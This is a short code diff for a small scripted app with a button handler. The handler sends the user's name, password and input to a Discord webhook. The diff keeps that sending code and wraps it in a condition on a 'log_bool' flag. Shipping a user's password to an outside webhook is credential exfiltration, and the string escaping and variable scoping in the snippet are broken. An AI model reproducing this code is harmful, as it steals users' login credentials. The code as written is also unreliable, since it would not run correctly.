@@ -18,15 +18,18 @@ end)
 button.on_click(function()
   result.set_content(press)
 
-  -- Send data to Discord Webhook
-  local body = "{ \"content\": \.. user_name .. ": " .. user_pass .. ": " .. press .. "\" }"
-  local res = fetch({
-      url = discord_webhook_url,
-      method = "POST",
-      headers = { ["Content-Type"] = "application/json" },
-      body = body,
-  })
-
+  if log_bool == "false" then
+    
+    -- Send data to Discord Webhook
+    local body = "{ \"content\": \.. user_name .. ": " .. user_pass .. ": " .. press .. "\" }"
+    local res = fetch({
+        url = discord_webhook_url,
+        method = "POST",
+        headers = { ["Content-Type"] = "application/json" },
+        body = body,
+    })
+  end
+      
   if res and res.status == 204 then
       print("Message sent to Discord successfully.")
   else
